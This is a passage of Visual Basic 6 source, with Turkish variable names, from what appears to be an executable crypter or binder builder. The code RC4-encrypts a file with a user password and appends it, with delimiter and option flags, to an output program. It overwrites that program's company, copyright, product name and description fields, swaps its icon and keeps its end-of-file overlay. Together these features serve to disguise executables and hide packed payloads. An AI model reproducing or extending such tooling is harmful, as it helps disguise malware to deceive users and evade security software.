                            Next
                            
                            i = 1
                            For sayac = 1 To 30
                             Put #numara, 21156 + i, dizi(sayac)
                             i = i + 2
                            Next
                            
                            '2 - > 21261 - file desc - 10
                            fileinf = String(30, " ")
                            fileinf = lvw.ListItems(10).SubItems(1)
                            
                            For sayac = 1 To 30
                                karakter = Mid(fileinf, sayac, 1)
                                dizi(sayac) = karakter
                            Next
                            
                            i = 1
                            For sayac = 1 To 30
                             Put #numara, 21260 + i, dizi(sayac)
                             i = i + 2
                            Next
                            

                            '3 - > 21361 - copyright - 4
                            fileinf = String(30, " ")
                            fileinf = lvw.ListItems(4).SubItems(1)
                            
                            For sayac = 1 To 30
                                karakter = Mid(fileinf, sayac, 1)
                                dizi(sayac) = karakter
                            Next
                            
                            i = 1
                            For sayac = 1 To 30
                             Put #numara, 21360 + i, dizi(sayac)
                             i = i + 2
                            Next

                            '4 - > 21465 - Legal Trademarks - 16
                            fileinf = String(30, " ")
                            fileinf = lvw.ListItems(16).SubItems(1)
                            
                            For sayac = 1 To 30
                                karakter = Mid(fileinf, sayac, 1)
                                dizi(sayac) = karakter
                            Next
                            
                            i = 1
                            For sayac = 1 To 30
                             Put #numara, 21464 + i, dizi(sayac)
                             i = i + 2
                            Next
                            
                            
                            '5 - > 21561 - product name - 8
                            fileinf = String(30, " ")
                            fileinf = lvw.ListItems(8).SubItems(1)
                            
                            For sayac = 1 To 30
                                karakter = Mid(fileinf, sayac, 1)
                                dizi(sayac) = karakter
                            Next
                            
                            i = 1
                            For sayac = 1 To 30
                             Put #numara, 21560 + i, dizi(sayac)
                             i = i + 2
                            Next

                            limit = "9876543210"
                            yazilacak = RC4(gecici, sifre) & limit & sifre & limit & CStr(chc(1).Value) & limit & CStr(chc(2).Value) & limit & CStr(chc(3).Value) & limit & CStr(chc(4).Value) & limit & CStr(chc(5).Value) & limit & CStr(chc(9).Value) & limit & ReadEOFData(txt.Text)
                            Put #numara, LOF(numara) + 1, limit & yazilacak & limit
                        Close #numara
                        
                        If simge.ToolTipText <> "" And Dir(simge.ToolTipText) <> "" Then
                            Call InsertIcons(simge.ToolTipText, dosya)
                            Call InsertIcons(simge.ToolTipText, dosya)
                        End If
                        
                       
                        hk 17
            Else
                hk 18
            End If
            bar.Value = 100
        Case 2
        
            Call ShellExecute(&O0, vbNullString, "http://www.tikkysoft.com/tikky/", vbNullString, vbNullString, vbNormalFocus)
        
        
        Case 3
            frmabout.Show
            
        Case 5
            dosya = ""
            hk 19
            If VBGetOpenFileName(dosya, , True, , , , "ICO FILES(*.ICO)|*.ico", 1, , "SELECT ICON", , Me.hWnd) Then
                simge.ToolTipText = dosya
                simge.Picture = LoadPicture(simge.ToolTipText)
                hk 20
            Else
            hk 21
            End If
        Case 6
            frmiconhunter.Show , Me
        Case 4, 7
            End
            
    
    
    End Select
End Sub

Private Sub chc_Click(Index As Integer)
    Select Case Index
        Case 0
            Combo1.Enabled = Not Combo1.Enabled
            
    End Select
End Sub


Private Sub dil_Click()
MsgBox dil.ListIndex
End Sub


Private Sub dilop_Click()
dilayarlari
End Sub

Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    tasi Me
End Sub

Sub dilayarlari()
dil.Clear
Open App.Path & "\Language\" & dilop.Text & ".lng" For Input As #1
    Do While Not EOF(1)
    Line Input #1, okunan
    dil.AddItem okunan
    Loop
Close #1
txtlog.Text = ""
hk 5

chc(0).Caption = dil.List(22)

lbl(0).Caption = dil.List(25)
lbl(1).Caption = dil.List(26)
lbl(2).Caption = dil.List(27)
lbl(3).Caption = dil.List(28)
lbl(4).Caption = dil.List(29)
lbl(5).Caption = dil.List(30)
lbl(6).Caption = dil.List(31)


lvw.ColumnHeaders(1).Text = dil.List(23)
lvw.ColumnHeaders(2).Text = dil.List(24)

btn(0).ToolTipText = dil.List(32)
btn(1).ToolTipText = dil.List(33)
btn(2).ToolTipText = dil.List(34)
btn(3).ToolTipText = dil.List(35)
btn(4).ToolTipText = dil.List(36)
btn(5).ToolTipText = dil.List(37)
btn(6).ToolTipText = dil.List(38)
btn(7).ToolTipText = dil.List(36)
End Sub


Private Sub Form_Load()

Combo1.Text = "7"
File1.Path = App.Path & "\Language\"

    For sayac = 0 To File1.ListCount - 1
        dilop.AddItem Mid(File1.List(sayac), 1, Len(File1.List(sayac)) - 4)
    Next

dilop.Text = "english"


dilayarlari



For sayac = 0 To chc.UBound
    chc(sayac).MouseIcon = btn(0).MouseIcon
Next
dilop.MouseIcon = btn(0).MouseIcon
Combo1.MouseIcon = btn(0).MouseIcon
lvw.MouseIcon = btn(0).MouseIcon

    SaydamYap Me, 240
    
                hHeader = SendMessageLong(lvw.hWnd, LVM_GETHEADER, 0, ByVal 0&)
            Style = GetWindowLong(hHeader, GWL_STYLE)
            Style = Style Xor HDS_BUTTONS
                If Style Then
                    R = SetWindowLong(hHeader, GWL_STYLE, Style)
                    R = SetWindowPos(lvw.hWnd, Me.hWnd, 0, 0, 0, 0, SWP_FLAGS)
                End If
                


    listeyitemizle

End Sub


Sub listeyitemizle()
  With lvw
    .ListItems.Clear
    .ListItems.Add , , "File", , 1
    .ListItems.Add , , "Language", , 2
    .ListItems.Add , , "Company", , 3
    .ListItems.Add , , "Copyright", , 4
    .ListItems.Add , , "Internal Name", , 5
    .ListItems.Add , , "Original Name", , 6
    .ListItems.Add , , "File Version", , 7
    .ListItems.Add , , "Product Name", , 8
    .ListItems.Add , , "Product Version", , 9
    .ListItems.Add , , "File Desc", , 10
    .ListItems.Add , , "File Flags", , 11
    .ListItems.Add , , "File OS", , 12
    .ListItems.Add , , "File Type", , 13
    .ListItems.Add , , "File Sub-type", , 14
    .ListItems.Add , , "Comments", , 15
    .ListItems.Add , , "Legal Copyright", , 16
    .ListItems.Add , , "Legal Trademarks", , 17
    .ListItems.Add , , "Private Build", , 18
    .ListItems.Add , , "Special Build", , 19
 End With
                lvw.ListItems(3).ForeColor = vbRed
                lvw.ListItems(4).ForeColor = vbRed
                lvw.ListItems(8).ForeColor = vbRed
                lvw.ListItems(10).ForeColor = vbRed
                lvw.ListItems(15).ForeColor = vbRed
                lvw.ListItems(17).ForeColor = vbRed
End Sub
Sub versionbilgisial()
   Dim bilgi As FILEVERINFO
   listeyitemizle
   If GetVersionInfo(dosya, bilgi) Then
     With lvw
        .ListItems(1).SubItems(1) = dosya
        .ListItems(2).SubItems(1) = bilgi.Language
        .ListItems(3).SubItems(1) = bilgi.Company
        .ListItems(4).SubItems(1) = bilgi.Copyright
        .ListItems(5).SubItems(1) = bilgi.InternalName
        .ListItems(6).SubItems(1) = bilgi.OriginalName
        .ListItems(7).SubItems(1) = bilgi.FileVer
        .ListItems(8).SubItems(1) = bilgi.ProductName
        .ListItems(9).SubItems(1) = bilgi.ProdVer
        .ListItems(10).SubItems(1) = bilgi.FileDesc
        .ListItems(11).SubItems(1) = bilgi.FileFlags
        .ListItems(12).SubItems(1) = bilgi.FileOS
        .ListItems(13).SubItems(1) = bilgi.FileType
        .ListItems(14).SubItems(1) = bilgi.FileSubtype
        .ListItems(15).SubItems(1) = bilgi.Comments
        .ListItems(16).SubItems(1) = bilgi.LegalCopyright
        .ListItems(17).SubItems(1) = bilgi.LegalTrademarks
        .ListItems(18).SubItems(1) = bilgi.PrivateBuild
        .ListItems(19).SubItems(1) = bilgi.SpecialBuild
    End With
   End If
   
   For sayac = 1 To 19
    If lvw.ListItems(sayac).SubItems(1) = "" Then lvw.ListItems(sayac).SubItems(1) = "-"
   Next
   
End Sub


 
Function hk(Index As Integer)
    If Mid(dil.List(Index), 1, 1) = "1" Then
        txtlog.Text = txtlog.Text & dil.List(0) & Mid(dil.List(Index), 2, Len(dil.List(Index)) - 1) & vbCrLf
    Else
        txtlog.Text = txtlog.Text & dil.List(1) & Mid(dil.List(Index), 2, Len(dil.List(Index)) - 1) & vbCrLf
    End If
    txtlog.SelStart = Len(txtlog.Text)
End Function

Private Sub lvw_BeforeLabelEdit(Cancel As Integer)
    Cancel = 1
End Sub

Private Sub lvw_DblClick()
If lvw.ListItems.Count > 0 And txt.Text <> "" Then
    Select Case lvw.SelectedItem.Index
        Case 3, 4, 8, 10, 15, 17, 18, 19
        lvw.SelectedItem.SubItems(1) = InputBox(dil.List(8), dil.List(9), lvw.SelectedItem.SubItems(1))
            If lvw.SelectedItem.Index = 17 Then
                lvw.ListItems(18).SubItems(1) = lvw.ListItems(17).SubItems(1)
                lvw.ListItems(19).SubItems(1) = lvw.ListItems(17).SubItems(1)
            End If
    End Select
End If
End Sub

Function ReadEOFData(sFilePath As String) As String
    Dim sFileBuf As String, sEOFBuf As String, sChar As String
    Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
    
    On Error GoTo Err:
    If Dir(sFilePath) = "" Then GoTo Err:
    
    lFF = FreeFile
    
    Open sFilePath For Binary As #lFF
        sFileBuf = Space(LOF(lFF))
        Get #lFF, , sFileBuf
    Close #lFF
        
    lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
    sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
        
    ReadEOFData = StrReverse(sEOFBuf)
    Exit Function
    
Err:
    ReadEOFData = ""
End Function
Private Function GetNullBytes(lNum) As String
    Dim sBuf As String
    For i = 1 To lNum
        sBuf = sBuf & Chr(0)
    Next
    GetNullBytes = sBuf
End Function
Sub WriteEOFData(sFilePath As String, sEOFData As String)
    Dim sFileBuf As String
    Dim lFF As Long
    
    On Error Resume Next
    If Dir(sFilePath) = "" Then Exit Sub
    
    lFF = FreeFile
    
    Open sFilePath For Binary As #lFF
        sFileBuf = Space(LOF(lFF))
        Get #lFF, , sFileBuf
    Close #lFF
    
    Kill sFilePath
    
    Do Until Dir(sFilePath) = ""
        DoEvents
    Loop
    
    lFF = FreeFile
    
    Open sFilePath For Binary As #lFF
        Put #lFF, , sFileBuf & sEOFData
    Close #lFF
End Sub
